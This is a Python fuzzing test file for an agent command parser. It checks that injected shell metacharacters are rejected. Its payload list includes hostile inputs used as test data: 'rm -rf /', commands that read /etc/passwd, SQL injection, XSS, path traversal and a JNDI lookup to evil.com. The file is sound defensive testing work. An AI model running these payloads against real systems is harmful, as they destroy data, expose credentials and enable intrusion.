"""
Fuzzing Tests for Command Parser Security
Implements comprehensive fuzzing to find security vulnerabilities.
"""

import sys
import atheris
import random
import string
from src.command_parser import SecureCommandParser, CommandValidationError


def TestOneInput(data):
    """Atheris fuzzing entry point."""
    try:
        # Convert bytes to string
        if isinstance(data, bytes):
            try:
                text = data.decode('utf-8', errors='ignore')
            except:
                return
        else:
            text = str(data)
        
        # Skip empty inputs
        if not text.strip():
            return
        
        # Create parser
        parser = SecureCommandParser()
        
        # Try parsing the fuzzed input
        try:
            result = parser.parse_command(text)
            
            # If parsing succeeded, validate the result is safe
            assert isinstance(result.command, str)
            assert isinstance(result.args, list)
            assert result.command in parser.allowed_commands
            
            # Ensure no dangerous characters made it through
            dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '<', '>']
            for arg in result.args:
                for char in dangerous_chars:
                    if char in arg:
                        raise AssertionError(f"Dangerous character '{char}' found in argument: {arg}")
                        
        except CommandValidationError:
            # Expected for invalid/malicious input
            pass
        except AssertionError:
            # Re-raise assertion errors (these indicate security issues)
            raise
        except Exception as e:
            # Unexpected errors might indicate bugs
            print(f"Unexpected error: {e} for input: {repr(text)}")
            raise
            
    except Exception as e:
        # Don't crash the fuzzer on expected exceptions
        if "CommandValidationError" in str(type(e)):
            pass
        else:
            raise


def generate_test_inputs():
    """Generate diverse test inputs for manual fuzzing."""
    inputs = []
    
    # Basic command structures
    commands = ['start-agent', 'stop-agent', 'status-agent', 'list-agents', 'help']
    agents = ['backend-architect', 'test-writer-fixer', 'ui-designer']
    
    # Valid commands
    for cmd in commands:
        inputs.append(f"!{cmd}")
        if cmd in ['start-agent', 'stop-agent', 'status-agent']:
            for agent in agents:
                inputs.append(f"!{cmd} {agent}")
    
    # Malicious payloads
    payloads = [
        # Command injection
        "; rm -rf /",
        "& cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "&& sleep 10",
        
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\windows\\system32",
        
        # SQL injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "UNION SELECT * FROM passwords",
        
        # XSS
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        
        # Encoding attacks
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "\\x2e\\x2e\\x2fetc\\x2fpasswd",
        "\u002e\u002e\u002fetc\u002fpasswd",
        
        # Control characters
        "\x00",
        "\r\necho harmful",
        "\x1b[31mred text",
        
        # Unicode attacks  
        "café",
        "𝕏𝕊𝕊",
        "测试",
        
        # Long inputs
        "A" * 1000,
        "A" * 2000,
        
        # Null bytes
        "agent\x00malicious",
        "agent\x00.service",
        
        # Format string attacks
        "%s%s%s%s",
        "%n%n%n%n",
        "${jndi:ldap://evil.com}",
    ]
    
    # Combine commands with payloads
    for cmd in commands:
        for payload in payloads:
            inputs.extend([
                f"!{cmd} {payload}",
                f"!{cmd}{payload}",
                f"!{payload}",
                f"{payload}!{cmd}",
                f"!{cmd} agent {payload}",
            ])
    
    # Random character combinations
    charset = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    for _ in range(100):
        length = random.randint(1, 500)
        random_input = ''.join(random.choices(charset, k=length))
        inputs.append(random_input)
    
    # Binary data simulation
    for _ in range(50):
        binary_data = bytes(random.randint(0, 255) for _ in range(random.randint(1, 100)))
        try:
            text_data = binary_data.decode('utf-8', errors='ignore')
            if text_data:
                inputs.append(text_data)
        except:
            pass
    
    return inputs


def manual_fuzzing():
    """Manual fuzzing without atheris."""
    print("Running manual fuzzing tests...")
    
    parser = SecureCommandParser()
    inputs = generate_test_inputs()
    
    passed = 0
    blocked = 0
    errors = 0
    
    for i, test_input in enumerate(inputs):
        try:
            result = parser.parse_command(test_input)
            
            # If parsing succeeded, validate it's safe
            dangerous_chars = ['&', '|', ';', '`', '$', '(', ')']
            has_dangerous = any(
                any(char in arg for char in dangerous_chars)
                for arg in result.args
            )
            
            if has_dangerous:
                print(f"SECURITY ISSUE: Dangerous characters in parsed result: {test_input}")
                errors += 1
            else:
                passed += 1
                
        except CommandValidationError:
            blocked += 1
        except Exception as e:
            print(f"Unexpected error for input '{test_input}': {e}")
            errors += 1
    
    total = len(inputs)
    print(f"\nFuzzing Results:")
    print(f"Total inputs: {total}")
    print(f"Passed (safe): {passed} ({passed/total*100:.1f}%)")
    print(f"Blocked: {blocked} ({blocked/total*100:.1f}%)")
    print(f"Errors: {errors} ({errors/total*100:.1f}%)")
    
    # Security assessment
    blocking_rate = blocked / total * 100
    if blocking_rate >= 85:
        print(f"✅ Good security: {blocking_rate:.1f}% of inputs blocked")
    elif blocking_rate >= 70:
        print(f"⚠️ Moderate security: {blocking_rate:.1f}% of inputs blocked")
    else:
        print(f"❌ Poor security: {blocking_rate:.1f}% of inputs blocked")
    
    if errors > 0:
        print(f"❌ {errors} security issues found!")
        return False
    
    return blocking_rate >= 70


def main():
    """Main fuzzing entry point."""
    if len(sys.argv) > 1 and sys.argv[1] == 'atheris':
        # Use atheris if available
        try:
            atheris.Setup(sys.argv, TestOneInput)
            atheris.Fuzz()
        except ImportError:
            print("Atheris not available, falling back to manual fuzzing")
            manual_fuzzing()
    else:
        # Manual fuzzing
        return manual_fuzzing()


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)